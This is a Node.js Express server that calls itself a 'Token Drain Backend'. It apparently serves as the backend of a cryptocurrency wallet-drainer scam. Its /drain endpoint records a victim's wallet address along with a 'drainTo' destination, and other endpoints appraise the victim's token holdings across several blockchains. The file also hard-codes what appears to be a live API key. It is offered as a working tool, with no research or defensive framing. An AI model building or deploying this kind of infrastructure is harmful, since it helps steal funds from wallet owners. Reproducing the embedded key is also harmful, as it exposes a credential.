const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
app.use(cors());
app.use(express.json());

const COVALENT_API_KEY = "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";

// ==================== ROOT ENDPOINT ====================
app.get('/', (req, res) => {
  res.json({ 
    message: 'Token Drain Backend API',
    version: '2.0.0',
    status: 'online',
    endpoints: {
      'POST /drain': 'Log wallet connection',
      'GET /tokens/:address': 'Get wallet tokens on Ethereum',
      'GET /tokens/:address/:chainId': 'Get wallet tokens on specific chain',
      'GET /health': 'Health check',
      'GET /chains': 'Get supported chains'
    },
    timestamp: new Date().toISOString()
  });
});

// ==================== HEALTH CHECK ====================
app.get('/health', (req, res) => {
  res.json({ 
    status: 'online', 
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: process.memoryUsage()
  });
});

// ==================== SUPPORTED CHAINS ====================
app.get('/chains', (req, res) => {
  res.json({
    chains: [
      { id: 1, name: 'Ethereum', symbol: 'ETH' },
      { id: 56, name: 'Binance Smart Chain', symbol: 'BNB' },
      { id: 137, name: 'Polygon', symbol: 'MATIC' },
      { id: 42161, name: 'Arbitrum', symbol: 'ETH' },
      { id: 10, name: 'Optimism', symbol: 'ETH' },
      { id: 8453, name: 'Base', symbol: 'ETH' },
      { id: 43114, name: 'Avalanche', symbol: 'AVAX' },
      { id: 250, name: 'Fantom', symbol: 'FTM' }
    ]
  });
});

// ==================== DRAIN LOGGING ====================
app.post('/drain', async (req, res) => {
  try {
    console.log("📥 Drain request received:", JSON.stringify(req.body, null, 2));
    
    const { address, chainId, drainTo } = req.body;
    
    if (!address) {
      return res.status(400).json({ 
        success: false,
        error: "Missing wallet address" 
      });
    }
    
    if (!drainTo) {
      return res.status(400).json({ 
        success: false,
        error: "Missing drain address" 
      });
    }
    
    // Log the connection
    console.log(`✅ Wallet Connection Logged:`);
    console.log(`   Wallet: ${address}`);
    console.log(`   Chain: ${chainId || 'Not specified'}`);
    console.log(`   Drain To: ${drainTo}`);
    console.log(`   Time: ${new Date().toISOString()}`);
    
    // Return success
    res.json({ 
      success: true, 
      message: "Connection logged successfully",
      data: {
        walletAddress: address,
        chainId: chainId || 1,
        drainTo: drainTo,
        loggedAt: new Date().toISOString(),
        status: "logged"
      }
    });
    
  } catch (error) {
    console.error("❌ Drain endpoint error:", error);
    res.status(500).json({ 
      success: false,
      error: error.message 
    });
  }
});

// ==================== GET TOKENS (Ethereum) ====================
app.get('/tokens/:address', async (req, res) => {
  try {
    const { address } = req.params;
    const chainId = 1; // Default to Ethereum
    
    if (!address || !address.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid Ethereum address required" 
      });
    }
    
    console.log(`🔍 Fetching tokens for ${address} on chain ${chainId}`);
    
    // Fetch from Covalent API
    const response = await fetch(
      `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`
    );
    
    if (!response.ok) {
      throw new Error(`Covalent API error: ${response.status}`);
    }
    
    const data = await response.json();
    const items = data.data?.items || [];
    
    // Process tokens
    const tokens = items
      .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
      .map(t => {
        const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
        const value = (t.quote_rate || 0) * amount;
        
        return {
          symbol: t.contract_ticker_symbol || (t.native_token ? 'ETH' : 'TOKEN'),
          name: t.contract_name || (t.native_token ? 'Ethereum' : 'Unknown Token'),
          amount: amount,
          formattedAmount: amount.toLocaleString(undefined, {
            minimumFractionDigits: 0,
            maximumFractionDigits: 6
          }),
          value: value,
          formattedValue: value ? `$${value.toFixed(2)}` : null,
          contractAddress: t.contract_address,
          isNative: t.native_token || false,
          decimals: t.contract_decimals || 18,
          logoUrl: t.logo_url,
          chainId: chainId
        };
      });
    
    // Calculate totals
    const totalValue = tokens.reduce((sum, t) => sum + t.value, 0);
    const nativeToken = tokens.find(t => t.isNative);
    const erc20Tokens = tokens.filter(t => !t.isNative);
    
    res.json({
      success: true,
      data: {
        address: address,
        chainId: chainId,
        chainName: 'Ethereum',
        nativeBalance: nativeToken ? {
          symbol: nativeToken.symbol,
          amount: nativeToken.amount,
          value: nativeToken.value
        } : null,
        tokens: tokens,
        summary: {
          totalTokens: tokens.length,
          totalValue: totalValue,
          nativeTokens: nativeToken ? 1 : 0,
          erc20Tokens: erc20Tokens.length,
          scannedAt: new Date().toISOString()
        }
      }
    });
    
  } catch (error) {
    console.error("❌ Get tokens error:", error);
    res.status(500).json({ 
      success: false,
      error: error.message,
      fallback: "Using frontend Covalent API directly"
    });
  }
});

// ==================== GET TOKENS (Any Chain) ====================
app.get('/tokens/:address/:chainId', async (req, res) => {
  try {
    const { address, chainId } = req.params;
    
    if (!address || !address.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid Ethereum address required" 
      });
    }
    
    if (!chainId || isNaN(chainId)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid chain ID required" 
      });
    }
    
    console.log(`🔍 Fetching tokens for ${address} on chain ${chainId}`);
    
    // Fetch from Covalent API
    const response = await fetch(
      `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`
    );
    
    if (!response.ok) {
      // Return empty result instead of error for unsupported chains
      return res.json({
        success: true,
        data: {
          address: address,
          chainId: parseInt(chainId),
          chainName: `Chain ${chainId}`,
          tokens: [],
          summary: {
            totalTokens: 0,
            totalValue: 0,
            scannedAt: new Date().toISOString(),
            note: "Chain not supported or no tokens found"
          }
        }
      });
    }
    
    const data = await response.json();
    const items = data.data?.items || [];
    
    // Process tokens
    const tokens = items
      .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
      .map(t => {
        const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
        const value = (t.quote_rate || 0) * amount;
        
        return {
          symbol: t.contract_ticker_symbol || (t.native_token ? 'Native' : 'TOKEN'),
          name: t.contract_name || (t.native_token ? 'Native Token' : 'Unknown Token'),
          amount: amount,
          formattedAmount: amount.toLocaleString(undefined, {
            minimumFractionDigits: 0,
            maximumFractionDigits: 6
          }),
          value: value,
          formattedValue: value ? `$${value.toFixed(2)}` : null,
          contractAddress: t.contract_address,
          isNative: t.native_token || false,
          decimals: t.contract_decimals || 18,
          logoUrl: t.logo_url,
          chainId: parseInt(chainId)
        };
      });
    
    // Calculate totals
    const totalValue = tokens.reduce((sum, t) => sum + t.value, 0);
    
    res.json({
      success: true,
      data: {
        address: address,
        chainId: parseInt(chainId),
        chainName: getChainName(chainId),
        tokens: tokens,
        summary: {
          totalTokens: tokens.length,
          totalValue: totalValue,
          scannedAt: new Date().toISOString()
        }
      }
    });
    
  } catch (error) {
    console.error("❌ Get tokens by chain error:", error);
    res.status(500).json({ 
      success: false,
      error: error.message
    });
  }
});

// ==================== MULTI-CHAIN TOKEN SCAN ====================
app.get('/scan-all/:address', async (req, res) => {
  try {
    const { address } = req.params;
    const chains = [1, 56, 137, 42161, 10, 8453, 43114, 250]; // Supported chains
    
    if (!address || !address.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid Ethereum address required" 
      });
    }
    
    console.log(`🔍 Multi-chain scan for ${address}`);
    
    const results = [];
    
    // Scan each chain (limit to 3 for performance)
    const chainsToScan = chains.slice(0, 3);
    
    for (const chainId of chainsToScan) {
      try {
        const response = await fetch(
          `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`
        );
        
        if (response.ok) {
          const data = await response.json();
          const items = data.data?.items || [];
          
          const tokens = items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
              const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
              const value = (t.quote_rate || 0) * amount;
              
              return {
                symbol: t.contract_ticker_symbol || (t.native_token ? 'Native' : 'TOKEN'),
                name: t.contract_name || (t.native_token ? 'Native Token' : 'Unknown Token'),
                amount: amount,
                value: value,
                contractAddress: t.contract_address,
                isNative: t.native_token || false,
                chainId: chainId,
                chainName: getChainName(chainId)
              };
            });
          
          if (tokens.length > 0) {
            results.push({
              chainId: chainId,
              chainName: getChainName(chainId),
              tokens: tokens,
              totalValue: tokens.reduce((sum, t) => sum + t.value, 0)
            });
          }
        }
      } catch (error) {
        console.log(`Chain ${chainId} scan failed:`, error.message);
      }
    }
    
    const allTokens = results.flatMap(r => r.tokens);
    const totalValue = results.reduce((sum, r) => sum + r.totalValue, 0);
    
    res.json({
      success: true,
      data: {
        address: address,
        chainsScanned: chainsToScan.length,
        chainsWithTokens: results.length,
        results: results,
        summary: {
          totalTokens: allTokens.length,
          totalValue: totalValue,
          scannedAt: new Date().toISOString(),
          scanDuration: `${chainsToScan.length} chains scanned`
        }
      }
    });
    
  } catch (error) {
    console.error("❌ Multi-chain scan error:", error);
    res.status(500).json({ 
      success: false,
      error: error.message
    });
  }
});

// ==================== HELPER FUNCTIONS ====================
function getChainName(chainId) {
  const chains = {
    1: 'Ethereum',
    56: 'Binance Smart Chain',
    137: 'Polygon',
    42161: 'Arbitrum',
    10: 'Optimism',
    8453: 'Base',
    43114: 'Avalanche',
    250: 'Fantom'
  };
  return chains[chainId] || `Chain ${chainId}`;
}

// ==================== ERROR HANDLING ====================
app.use((req, res) => {
  res.status(404).json({ 
    success: false,
    error: "Endpoint not found",
    availableEndpoints: {
      "GET /": "API information",
      "POST /drain": "Log wallet connection",
      "GET /tokens/:address": "Get tokens on Ethereum",
      "GET /tokens/:address/:chainId": "Get tokens on specific chain",
      "GET /scan-all/:address": "Scan all chains",
      "GET /health": "Health check",
      "GET /chains": "Supported chains"
    }
  });
});

// ==================== SERVER START ====================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Token Drain Backend running on port ${PORT}`);
  console.log(`📊 Health: http://localhost:${PORT}/health`);
  console.log(`📖 API Docs: http://localhost:${PORT}/`);
  console.log(`⚠️  REMINDER: Remove any exposed private keys from the code!`);
});
